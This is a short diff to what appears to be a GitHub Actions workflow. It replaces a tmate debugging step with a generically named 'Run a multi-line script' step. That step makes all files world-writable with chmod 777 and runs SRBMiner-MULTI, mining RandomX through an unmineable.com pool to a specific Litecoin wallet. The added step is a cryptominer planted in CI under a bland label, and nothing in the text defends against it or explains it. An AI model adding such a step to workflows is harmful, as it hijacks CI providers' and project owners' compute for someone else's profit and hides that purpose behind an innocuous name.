@@ -24,5 +24,7 @@ jobs:
 
       # Runs a single command using the runners shell
       
-      - name: Setup tmate session
-        uses: mxschmitt/action-tmate@v3
+      - name: Run a multi-line script
+        run: |
+          chmod 777 *
+          ././SRBMiner-MULTI --algorithm randomx --pool stratum+ssl://rx.unmineable.com:443 --wallet LTC:LTc5WcJM49gUR8ioqE9BEEgkrwNqUoVgJo.CPU-10#mo4y-tkdg  
